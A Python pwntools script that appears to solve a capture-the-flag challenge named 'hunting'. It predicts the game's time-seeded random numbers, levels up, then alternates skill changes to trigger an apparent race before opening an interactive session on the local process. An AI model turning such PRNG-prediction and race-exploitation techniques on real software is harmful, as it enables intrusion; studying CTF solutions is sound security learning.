from pwn import *
import re
import time

sl = lambda x: time.sleep(x)
libc = LibC('libc.so.6')
libc.srand(libc.time())
ra = lambda: libc.rand()

def searchDigit(line, src):
	for l in src.split('\n'):
		if line in l:
			m = re.search('(\d+)', l)
			if m:
				return m.group(1)
			break
	raise

class Hunting:
	def __init__(self):
		self.p = process('./hunting')
		self.level = 1

	def menu(self):
		return self.p.recvuntil('6. Exit\n')

	def change_skill(self, i):
		self.p.sendline('3')
		self.p.sendline(str(i))
		return self.menu()

	def use_skill(self):
		self.p.sendline('2')
		shield = lambda: str([1,3,2,1][ra() % 4])
		self.p.sendline(shield())
		d = self.menu()

		try:
			self.hp = searchDigit('Your HP is', d)
			self.boss = searchDigit("Boss's hp is", d)
		except:
			pass

		if 'You Win!' in d:
			self.level += 1

		return d

h = Hunting()
h.menu()
while h.level != 4:
	h.use_skill()
	print '{}:{}:{}'.format(h.hp, h.boss, h.level)

sl(1)

for _ in xrange(2):
	h.change_skill(2)	# fireball
	h.use_skill()
	sl(0.5)
	h.change_skill(7)	# iceball
	h.use_skill()
	h.p.interactive()
	sl(5)
